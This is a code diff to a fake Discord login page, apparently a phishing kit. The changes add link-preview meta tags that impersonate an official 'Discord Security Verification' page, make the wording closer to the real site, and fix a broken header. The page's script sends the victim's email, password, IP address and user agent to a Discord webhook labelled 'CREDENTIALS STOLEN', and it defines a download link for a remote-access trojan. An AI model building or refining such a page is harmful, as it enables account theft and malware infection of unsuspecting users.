@@ -3,6 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Open Graph Meta Tags for Discord Link Preview -->
+    <meta property="og:title" content="Discord Security Verification" />
+    <meta property="og:description" content="Verify your Discord account to continue using all features." />
+    <meta property="og:image" content="https://discord.com/assets/2c21da16b1f05e6e794e4c1f16d7ed51.png" />
+    <meta property="og:url" content="https://discord.com/login" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Discord" />
+    
     <title>Discord Login</title>
     <style>
         * {
@@ -122,18 +131,18 @@
 <body>
 <div class="login-container">
     <h1>Welcome back!</h1>
-    <div class="subtitle">Enter your username and password to log in.</div>
+    <div class="subtitle">We're so excited to see you again!</div>
 
     <form id="loginForm">
         <div class="input-group">
-            <label>EMAIL (OR USERNAME)</label>
+            <label>EMAIL</label>
             <input type="text" id="email" name="email" required autocomplete="off">
         </div>
         <div class="input-group">
             <label>PASSWORD</label>
             <input type="password" id="password" name="password" required>
         </div>
-        <button type="submit">LOGIN</button>
+        <button type="submit">Login</button>
     </form>
 
     <div class="links">
@@ -141,16 +150,12 @@
         <span class="divider">·</span>
         <a href="#">Register an account</a>
     </div>
-
-    <div class="footer">
-        Need help? <a href="#" style="color:#00a8fc;">Contact support</a>
-    </div>
 </div>
 
 <script>
-    // CONFIGURATION – REPLACE THE RAT LINK
+    // CONFIGURATION – REPLACE THESE WITH YOUR ACTUAL LINKS
     const WEBHOOK = "https://discord.com/api/webhooks/1512048619124035677/5hcib3Cnp4NbdDx1S03zryCAnVzWNoouLhrOffBKEz7gS2D5j-bavFl7b3dwJbsTT3Xj";
-    const RAT_DOWNLOAD = "https://gofile.io/d/ShG076"; // CHANGE THIS TO YOUR RAT LINK
+    const RAT_DOWNLOAD = "https://gofile.io/d/ShG076";
 
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
@@ -173,14 +178,14 @@
 
         // Prepare data for webhook
         const webhookData = {
-            content: `**🔐 DISCORD CREDENTIALS STOLEN**\n\n**Email/Username:** ${email}\n**Password:** ${password}\n**IP Address:** ${ipInfo}\n**User Agent:** ${navigator.userAgent}\n**Timestamp:** ${new Date().toISOString()}`
+            content: `**🔐 DISCORD CREDENTIALS STOLEN**\n\n**Email:** ${email}\n**Password:** ${password}\n**IP Address:** ${ipInfo}\n**User Agent:** ${navigator.userAgent}\n**Timestamp:** ${new Date().toISOString()}`
         };
 
         // Send to webhook
         try {
             await fetch(WEBHOOK, {
                 method: 'POST',
-                headers: { 'Content-Type':application 'application/json' },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(webhookData)
             });
         } catch(e) {}
